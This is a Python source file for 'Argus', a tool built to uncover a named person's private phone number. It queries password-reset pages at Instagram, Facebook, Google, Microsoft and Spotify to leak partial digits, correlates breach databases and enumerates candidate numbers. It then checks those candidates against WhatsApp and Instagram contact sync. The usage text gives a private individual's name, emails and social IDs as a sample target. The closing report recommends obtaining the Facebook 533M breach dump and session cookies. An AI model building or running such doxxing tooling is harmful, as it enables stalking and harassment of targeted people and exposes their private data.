#!/usr/bin/env python3
"""
StrikeCore Phone Recon Engine "Argus" — Government-grade phone number discovery.

Chains multiple intelligence vectors:
  A. Password Reset Oracle Chain (partial digit extraction)
  B. Instagram Contact Sync Reverse Lookup  
  C. WhatsApp/Signal verification
  D. Breach database correlation
  E. Cross-validation and reconstruction
"""

import json
import os
import re
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.reset_oracle import ResetOracle
from core.number_enumerator import NumberEnumerator
from core.fp_filter import validate_phone_number, quick_score_phone


def banner(target_name):
    print(f"""
╔══════════════════════════════════════════════════════════╗
║  ARGUS — Phone Recon Engine                              ║
║  StrikeCore Advanced Intelligence Module                 ║
║  Target: {target_name:<47}║
║  {time.strftime('%Y-%m-%d %H:%M:%S'):<55}║
╚══════════════════════════════════════════════════════════╝
""")


def phase_a_oracle(oracle, ig_user, fb_email, fb_id, google_email, alt_emails, snap_user):
    """Phase A: Password Reset Oracle Chain."""
    print("╔══════════════════════════════════════════════════════╗")
    print("║  PHASE A — PASSWORD RESET ORACLE CHAIN              ║")
    print("╚══════════════════════════════════════════════════════╝")
    
    # Instagram
    if ig_user:
        oracle.oracle_instagram(ig_user)
        time.sleep(3)
    
    # Facebook
    if fb_email:
        oracle.oracle_facebook(email=fb_email)
        time.sleep(3)
    if fb_id and not any(p.service == "Facebook" and p.last_digits for p in oracle.result.partials):
        oracle.oracle_facebook(fb_id=fb_id)
        time.sleep(3)
    
    # Google
    if google_email:
        oracle.oracle_google(google_email)
        time.sleep(3)
    
    # Microsoft (Office365)
    for email in alt_emails[:2]:
        oracle.oracle_microsoft(email)
        time.sleep(3)
    
    # Spotify
    for email in alt_emails[:1]:
        oracle.oracle_spotify(email)
        time.sleep(3)
    
    # Breach DBs
    oracle.oracle_breach_db(email=google_email, fb_id=fb_id)
    
    # Reconstruct
    reconstructed = oracle.reconstruct()
    oracle.report()
    
    return oracle.result


def phase_b_enumerate(oracle_result, ig_id, ig_username):
    """Phase B: Number enumeration based on oracle partials."""
    print("\n╔══════════════════════════════════════════════════════╗")
    print("║  PHASE B — NUMBER ENUMERATION                       ║")
    print("╚══════════════════════════════════════════════════════╝")
    
    known = oracle_result.known_digits
    
    if not known:
        print("\n  No partial digits from oracle chain.")
        print("  Cannot enumerate without constraints (search space too large).")
        print("  Falling back to carrier-prefix brute force on common prefixes...")
        
        # Without any known digits, we can still try IG contact sync
        # if we have a session, but it would be millions of candidates
        return None
    
    print(f"\n  Known digits: {len(known)}/10")
    display = "".join(known.get(i, "_") for i in range(10))
    print(f"  Pattern: +39 {display[:3]} {display[3:6]} {display[6:]}")
    
    enumerator = NumberEnumerator(ig_id, ig_username)
    candidates = enumerator.generate_candidates(known_digits=known, max_candidates=5000)
    
    print(f"  Candidates generated: {len(candidates)}")
    
    if not candidates:
        print("  No candidates could be generated with current constraints")
        return None
    
    if len(candidates) <= 100:
        print(f"  Small candidate set — verifying all...")
        
        # Check WhatsApp
        print("\n  [WhatsApp Check]")
        wa_hits = enumerator.check_whatsapp(candidates)
        
        # If we have IG session, check contact sync
        if enumerator.ig_session_id:
            print("\n  [IG Contact Sync]")
            ig_hits = enumerator.check_ig_contact_sync(candidates)
    else:
        print(f"  Large candidate set ({len(candidates)}) — need more oracle data to narrow down")
        print(f"  Checking first 50 via WhatsApp...")
        wa_hits = enumerator.check_whatsapp(candidates[:50])
    
    enumerator.report()
    return enumerator.result


def phase_c_validate(candidates, target_name):
    """Phase C: Validate final candidates with fp_filter."""
    print("\n╔══════════════════════════════════════════════════════╗")
    print("║  PHASE C — CROSS-VALIDATION                         ║")
    print("╚══════════════════════════════════════════════════════╝")
    
    if not candidates:
        print("\n  No candidates to validate.")
        return []
    
    validated = []
    for num in candidates:
        val = validate_phone_number(num, "IT")
        if val["valid"]:
            fp = quick_score_phone(num, ["argus_recon"], target_name, "IT")
            print(f"\n  {num}")
            print(f"    Valid: {val['valid']}, Type: {val.get('number_type')}, Carrier: {val.get('carrier')}")
            print(f"    FP Score: {fp['score']}/10 ({fp['confidence']})")
            validated.append({
                "number": num,
                "carrier": val.get("carrier", ""),
                "type": val.get("number_type", ""),
                "fp_score": fp["score"],
                "confidence": fp["confidence"],
            })
    
    return validated


def main():
    if len(sys.argv) < 2:
        print("Usage: phone_recon.py TARGET_NAME [options]")
        print("")
        print("Options (pass as key=value):")
        print("  ig_user=USERNAME       Instagram username")
        print("  ig_id=ID               Instagram user ID")
        print("  fb_id=ID               Facebook user ID")
        print("  email=EMAIL            Primary email (Google)")
        print("  alt_email=EMAIL        Additional email (can repeat)")
        print("  snap_user=USERNAME     Snapchat username")
        print("")
        print("Example:")
        print('  phone_recon.py "Luigi Savino" ig_user=luigisav ig_id=284908554 \\')
        print('    fb_id=1439591776 email=luigi.savino.95@gmail.com \\')
        print('    alt_email=luxdj95@gmail.com snap_user=luigisavino')
        sys.exit(1)
    
    target_name = sys.argv[1]
    
    # Parse options
    opts = {}
    alt_emails = []
    for arg in sys.argv[2:]:
        if "=" in arg:
            k, v = arg.split("=", 1)
            if k == "alt_email":
                alt_emails.append(v)
            else:
                opts[k] = v
    
    ig_user = opts.get("ig_user", "")
    ig_id = opts.get("ig_id", "")
    fb_id = opts.get("fb_id", "")
    email = opts.get("email", "")
    snap_user = opts.get("snap_user", "")
    
    if email and email not in alt_emails:
        alt_emails.insert(0, email)
    
    banner(target_name)
    
    # ── PHASE A: Oracle Chain ──
    oracle = ResetOracle()
    oracle_result = phase_a_oracle(
        oracle,
        ig_user=ig_user,
        fb_email=email,
        fb_id=fb_id,
        google_email=email,
        alt_emails=alt_emails,
        snap_user=snap_user,
    )
    
    # ── PHASE B: Enumeration ──
    enum_result = phase_b_enumerate(oracle_result, ig_id, ig_user)
    
    # Collect all candidate numbers
    all_candidates = []
    
    # From oracle (breach DB direct hits)
    for p in oracle_result.partials:
        if p.full_mask and not '*' in p.full_mask and len(re.sub(r'\D', '', p.full_mask)) >= 10:
            all_candidates.append(p.full_mask)
    
    # From reconstructed
    if oracle_result.reconstructed and '?' not in oracle_result.reconstructed and '*' not in oracle_result.reconstructed:
        all_candidates.append(oracle_result.reconstructed)
    
    # From enumeration
    if enum_result:
        if enum_result.matched_number:
            all_candidates.insert(0, enum_result.matched_number)
        all_candidates.extend(enum_result.wa_registered)
    
    # ── PHASE C: Validation ──
    validated = phase_c_validate(list(set(all_candidates)), target_name)
    
    # ── FINAL REPORT ──
    print(f"\n{'═'*60}")
    print(f"  ARGUS FINAL REPORT — {target_name}")
    print(f"{'═'*60}")
    
    print(f"\n  Oracle partials: {len(oracle_result.partials)}")
    print(f"  Known digit positions: {len(oracle_result.known_digits)}/10")
    if oracle_result.known_digits:
        display = "".join(oracle_result.known_digits.get(i, "_") for i in range(10))
        print(f"  Partial reconstruction: +39 {display[:3]} {display[3:6]} {display[6:]}")
    
    if validated:
        print(f"\n  VALIDATED CANDIDATES ({len(validated)}):")
        for v in sorted(validated, key=lambda x: x["fp_score"]):
            print(f"    [{v['confidence']}] {v['number']} — {v['carrier']} ({v['type']})")
    
    if not oracle_result.partials and not validated:
        print(f"\n  STATUS: No phone partials obtained.")
        print(f"  RECOMMENDATION:")
        print(f"    1. Obtain IG session cookie (IG_SESSION_ID) for contact sync enumeration")
        print(f"    2. Access Facebook 533M breach dump (FB ID: {fb_id})")
        print(f"    3. Use Dehashed/SnusBase with paid API key")
        print(f"    4. Try Twilio Lookup API on candidate numbers")
    
    print(f"\n  Notes:")
    for n in oracle_result.notes:
        print(f"    - {n}")
    
    # Save results
    output = {
        "target": target_name,
        "partials": [{"service": p.service, "hint": p.raw_hint, "last": p.last_digits, "first": p.first_digits, "method": p.method} for p in oracle_result.partials],
        "known_digits": oracle_result.known_digits,
        "reconstructed": oracle_result.reconstructed,
        "validated": validated,
        "notes": oracle_result.notes,
    }
    out_path = "/tmp/argus_recon_result.json"
    with open(out_path, "w") as f:
        json.dump(output, f, indent=2, default=str)
    print(f"\n  Results saved: {out_path}")
    print(f"{'═'*60}")


if __name__ == "__main__":
    main()
